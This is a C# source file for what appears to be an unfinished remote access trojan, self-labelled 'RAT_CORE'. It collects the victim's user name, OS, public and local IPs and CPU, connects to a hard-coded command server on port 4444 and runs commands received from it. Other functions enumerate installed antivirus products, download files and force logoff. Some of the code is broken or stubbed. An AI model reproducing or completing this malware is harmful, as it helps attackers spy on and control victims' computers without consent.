using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic;

namespace DynamicCore
{
    public class Core{public static void Main(string args) { Program p = new Program(); Application.Run(); } }

    public class Program
    {
        TcpClient client;
        StreamWriter writer;
        StreamReader reader;
        System.Windows.Forms.Timer timer30M = new System.Windows.Forms.Timer() { Interval = 2400000 };
        System.Windows.Forms.Timer timer1M = new System.Windows.Forms.Timer() { Interval = 60000 };
        System.Windows.Forms.Timer timer10S = new System.Windows.Forms.Timer() { Interval = 10000 };
        string RatServer       = "127.0.0.1";
        int     RatPort         = 4444;
        string  LocationServer  = "http://freegeoip.net/json/";
        string  Path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft";
        string _s = " $"; //To split
        int    ID = 0;
        string User = "";
        string Windows = "";
        string Location = "";
        string NetIP = "0.0.0.0";
        string LocalIP = "";
        string CPU = "";
        string RAM = "";

        public Program()
        {
            Application.ApplicationExit += Application_ApplicationExit;
            client = new TcpClient();
            Thread.Sleep(500);
            GetPCInfo();

            client.BeginConnect(RatServer, RatPort, Connect, null);
            Console.WriteLine("-----RAT_CORE-----");
        }

        void Connect(IAsyncResult ar)
        {
            try
            {
                client.EndConnect(ar);
                writer = new StreamWriter(client.GetStream());
                reader = new StreamReader(client.GetStream());
                SendPCInfo();

                client.GetStream().BeginRead(new byte[0], 0, 0, Read, null);
                Console.WriteLine("Bağlandı");
            }
            catch (SocketException e)
            {
                Console.WriteLine("Socket exc");
            }
            catch
            {
                Console.WriteLine("(Connect) exc");
            }
        }

        void Read(IAsyncResult ar)
        {
            string temp;
            while (client.Connected)
            {
                try
                {
                    temp = reader.ReadLine();
                    Parser(temp);
                }
                catch (IOException)
                {
                    return;
                }
            }
        }

        bool Send(string data)
        {
            try
            {
                writer.WriteLine( data.Replace('\n', ' ') );
                writer.Flush();
                return true;
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
                return false;
            }
        }

        void SendPCInfo()
        {
            if (Send("INFO|" + ID + _s + User + _s + Windows + _s + Location + _s + NetIP + _s + LocalIP + _s + CPU + _s + RAM))
                Console.WriteLine("Info sended");
            else
                Console.WriteLine("Info gönderilemedi !!!");


        }

        void GetPCInfo()
        {
            Windows = Environment.OSVersion.Platform + "\\" + Environment.OSVersion.VersionString;
            try
            {
                User = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            }
            catch
            {
            }
            try
            {
                Location = (new WebClient()).DownloadString(LocationServer);
                string[] temp = Location.Split('"');
                NetIP = temp[3];
            }
            catch
            {
            }
            try
            {
                foreach(IPAddress i in Dns.GetHostAddresses(Dns.GetHostName()))
                    LocalIP += i.ToString()+"/";
            }
            catch
            {
            }
            try
            {
                CPU = System.Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER");
                RAM = "unknown";
            }
            catch
            {
            }
        }

        void Parser(string rawData)
        {
            if (String.IsNullOrEmpty(rawData))
                return;

            string[] temp = rawData.Split('|');
            string Prefix = temp[0];
            string Message = "";
            for (int i = 1; i < temp.Length; i++) { Message += temp[i]; }
            switch (Prefix)
            {
                //#####################################################
                case "GETINFO":
                    SendPCInfo();
                    break;
                case "MSGBOX":
                    MessageBox.Show(Message);
                    break;
            }
        }

        private void Application_ApplicationExit(object sender, EventArgs e)
        {
            client.Close();
        }
        //OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
        List<string> GetAntivirusList()
        {
            List<string> temp = new List<string>();
            if (Directory.Exists("C:\\Program Files (x86)\\AVAST Software"))
                temp.Add("Avast(32)");
            if (Directory.Exists("C:\\Program Files (x86)\\AVG"))
                temp.Add("AVG(32)");
            if (Directory.Exists("C:\\Program Files (x86)\\Kaspersky Lab"))
                temp.Add("Kaspersky(32)");
            return temp;
        }

        void ChangeBackground(string link)
        {
            WebClient web = new WebClient();
            web.DownloadFile(link,  Path+"\\back.jpg");
            System.Drawing.Image image = System.Drawing.Image.FromFile(Path+"\\back.jpg");
            image.Save(Path + "\\wallpaper.bmp", System.Drawing.Imaging.ImageFormat.Bmp);

        }

        void PcShutdownRestartLogoffSleepHibernate(int whichOne)
        {
            switch (whichOne)
            {
                case 0:
                    System.Diagnostics.Process.Start("shutdown", "-l -t 00");
                    break;
                case 1:
                    System.Diagnostics.Process.Start("shutdown", "-l -t 00");
                    break;
                case 2:
                    System.Diagnostics.Process.Start("shutdown", "-l -t 00");
                    break;
                case 3:
                    System.Diagnostics.Process.Start("shutdown", "-l -t 00");
                    break;
                case 4:
                    System.Diagnostics.Process.Start("shutdown", "-l -t 00");
                    break;
                default:
                    return;
            }
        }

        void Monitor_OnOff(bool isOpen)
        {
            if (isOpen)
            {

            }else
            {

            }
        }

    }
}
